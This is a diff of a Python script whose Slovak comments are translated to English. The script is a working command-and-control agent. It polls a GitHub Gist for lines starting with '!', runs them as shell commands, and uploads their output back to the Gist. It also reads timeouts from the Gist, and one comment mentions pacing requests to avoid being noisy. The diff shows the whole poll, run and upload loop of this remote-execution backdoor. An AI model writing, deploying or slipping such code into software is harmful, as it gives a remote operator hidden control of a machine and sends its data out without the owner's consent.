@@ -47,7 +47,7 @@ if args.new: newGist = args.new
 
 def runCmd():
     outVar = ""
-    '''stderr posielam tiez na stdout'''
+    '''stderr to stdout'''
     proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     print("Subprocess executed\n")
     while True:
@@ -59,7 +59,7 @@ def runCmd():
         if outputStd:
             print(outputStd.decode('UTF-8').rstrip())
             outVar += outputStd.decode('UTF-8')
-    '''upload command output na Gist'''
+    '''upload command output to Gist'''
     toUploadAll = "#"+command+"\n("+time.ctime()+")\n\n"+outVar
     updateHeader = {'Authorization': token}
     updatePayload = {"description": "updated desc","public": "true","files": {gistName: {"content": toUploadAll}}}
@@ -110,7 +110,7 @@ last = None
 defTimeout = 6
 
 while True:
-    '''================= taham data z gist-u ===================='''
+    '''================= get data from gist ===================='''
     try:
         authHeader = {'Authorization': token}
         getContent = requests.get(gistUrl, headers=authHeader)
@@ -123,7 +123,6 @@ while True:
             if jsonData['message'] == "Bad credentials": 
                 print("Bad credentials/token")
                 exit(0)
-        '''json data (key content) do list-u na identifikaciu commandu'''
         try:
             jsonDataList = jsonData['files'][gistName]['content'].split("\n")
         except:
@@ -133,20 +132,18 @@ while True:
         for i in jsonDataList:
             cmdTimeout = None 
             if (len(i)>1 and i[0] == "?" and i[1:3]=="-t"):
-                '''?-t20 nastavi timeout na 20 sekund'''
+                '''?-t20 sets timeout to 20 sec'''
                 cmdTimeout = int(i[3:])
                 break
         for i in jsonDataList:
-            '''i existuje (proti prazdnym riadkom), musi zacinat na "!", a mat aspon 1 pismeno za vykricnikom => command'''
+            '''i exists, starts with "!" and containes at least one char => command'''
             commandsFound = 0
             if (len(i)>1 and i[0] == "!" and i[1].isalpha()):
-                '''ak najdem prvy retazec zacinajuci na !, co je relevantny command a odrezem '!' '''
                 command = i[1:]
                 if command != last: 
                     commandsFound += 1
                     print("New command found @Gist:", i[1:])
                     if cmdTimeout: print("Command timeout found and set to:", cmdTimeout, "seconds.")
-                '''for-cycle break(cycle end). Spusti command.'''
                 break
         if commandsFound == 0: 
             print("NO new command found @Gist")
@@ -154,21 +151,21 @@ while True:
             time.sleep(defTimeout)
             continue
 
-        '''==================== spusti runCmd() - zapis do premennej a upload =========================='''
+        '''==================== runCmd() - write to var and upload =========================='''
         if command != last:
             if __name__ == '__main__':
-                'multiprocessing viem terminovat, modul threading nie'''
+                'multiprocessing can be terminated, threading module not'''
                 p = multiprocessing.Process(target=runCmd)
                 p.start()
                 last = None
-                '''ochrana proti prinizkemu timeoutu. Mohlo by locknut Git API'''
+                '''prevent too short timeout'''
                 if not cmdTimeout: cmdTimeout = defTimeout
                 if (cmdTimeout < 5) or (cmdTimeout > 120): cmdTimeout = defTimeout
-                '''cakam minimalne defTimeout sekund, aby som nespamoval API'''
+                '''sleep not to flood API and be noisy'''
                 time.sleep(defTimeout)
-                '''ceste cakam do zvysku cmdTimeout-u, ak command neskoncil. Ak skoncil, ide novy While.'''
+                '''wait until the rest of cmdTimeout and then run next While loop.'''
                 if p.is_alive(): time.sleep(cmdTimeout-defTimeout)
-                '''ukonci beh, ak cmd este stake bezi aj po vycerpani cmdTimeout-u'''
+                '''quit after timeout'''
                 if p.is_alive(): 
                     p.terminate()               
                     timeoutError = ("No output. \n Command did not finish within defined timeout of "+str(cmdTimeout)+
